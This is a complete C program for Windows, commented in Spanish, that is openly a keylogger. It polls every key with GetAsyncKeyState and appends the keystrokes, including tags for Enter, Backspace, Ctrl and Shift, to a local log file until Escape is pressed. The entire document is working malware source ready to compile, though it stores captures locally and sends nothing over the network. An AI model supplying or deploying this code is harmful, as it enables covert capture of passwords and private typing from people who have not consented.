#include <windows.h>
#include <stdio.h>

int main()
{
    int c;      // Variable para almacenar el código de cada tecla.
    FILE *file; // Puntero al archivo de registro.

    // Al inicio del programa, abre el archivo de registro para agregar al final de él.
    file = fopen("keylogs.MD", "a+");
    // Comprueba si el archivo se abrió correctamente.
    if (file == NULL)
    {
        // Si el archivo no se abrió correctamente, imprime un mensaje de error y termina el programa.
        printf("No se pudo abrir el archivo\n");
        return 1;
    }
    // Escribe el mensaje de inicio de sesión en el archivo y luego lo cierra.
    fprintf(file, "[Keylogger/Nueva Sesion]:\n");
    fclose(file);

    // Bucle infinito para registrar continuamente las teclas presionadas.
    while (1)
    {
        // Bucle para recorrer todos los posibles códigos de teclas.
        for (c = 8; c <= 222; c++)
        {
            // Si la tecla correspondiente al código actual está siendo presionada...
            if (GetAsyncKeyState(c) == -32767)
            {
                // Abre el archivo de registro para agregar al final.
                file = fopen("keylogs.MD", "a+");
                // Comprueba si el archivo se abrió correctamente.
                if (file == NULL)
                {
                    // Si el archivo no se abrió correctamente, imprime un mensaje de error y termina el programa.
                    printf("No se pudo abrir el archivo\n");
                    return 1;
                }

                // Si el código de la tecla corresponde a un carácter imprimible básico...
                if ((c >= 39) && (c <= 64))
                {
                    // Imprime el carácter correspondiente en el archivo y luego lo cierra.
                    fputc(c, file);
                    fclose(file);
                }
                // Si el código de la tecla corresponde a una letra mayúscula o minúscula...
                else if ((c >= 65) && (c <= 90))
                {
                    // Si la tecla SHIFT o CAPSLOCK está activa...
                    if (GetKeyState(VK_SHIFT) & 0x8000 || GetKeyState(VK_CAPITAL) & 0x0001)
                    {
                        // Imprime la letra en mayúscula.
                        fputc(c, file);
                    }
                    else
                    {
                        // De lo contrario, imprime la letra en minúscula.
                        fputc(c + 32, file);
                    }
                    // Cierra el archivo.
                    fclose(file);
                }
                // Si la tecla no es un carácter imprimible básico ni una letra...
                else
                {
                    switch (c)
                    {
                    // Para los otros códigos de tecla, se usa un bloque switch para manejar cada caso especial.
                    case VK_SPACE:
                        // Si la tecla es la barra espaciadora (VK_SPACE), escribe un espacio en el archivo.
                        fputc(' ', file);
                        break;
                    case VK_RETURN:
                        // Si la tecla es Enter (VK_RETURN), escribe "[ENTER]\n" en el archivo.
                        fprintf(file, "[ENTER]\n");
                        break;
                    case VK_BACK:
                        // Si la tecla es retroceso (VK_BACK), escribe "[BACKSPACE]" en el archivo.
                        fprintf(file, "[BACKSPACE]");
                        break;
                    case VK_CONTROL:
                        // Si la tecla es Control (VK_CONTROL), escribe "[CTRL]" en el archivo.
                        fprintf(file, "[CTRL]");
                        break;
                    case VK_SHIFT:
                        // Si la tecla es Shift (VK_SHIFT), escribe "[SHIFT]" en el archivo.
                        fprintf(file, "[SHIFT]");
                        break;
                    case VK_OEM_MINUS:
                        // Si la tecla es el signo menos en el teclado (VK_OEM_MINUS), escribe "-" en el archivo.
                        fprintf(file, "-");
                        break;
                    case VK_OEM_PERIOD:
                        // Si la tecla es el punto en el teclado (VK_OEM_PERIOD), escribe "." en el archivo.
                        fprintf(file, ".");
                        break;
                    case VK_ESCAPE:
                        // Si la tecla es Escape (VK_ESCAPE), escribe "\n_________________________\n" en el archivo,
                        // lo que corresponde a dos saltos de línea al final de la sesión.
                        fprintf(file, "\n_________________________\n");
                        // Luego cierra el archivo y termina el programa.
                        fclose(file);
                        return 0; // termina el programa
                    default:
                        // Si el código de tecla no coincide con ninguno de los anteriores, simplemente se cierra el archivo.
                        break;
                    }
                    fclose(file);
                }
            }
        }
    }
    // Este bloque se ejecuta si el programa de alguna manera sale del bucle infinito.
    // En teoría, no debería suceder, pero se proporciona por completitud.
    return 0;
}
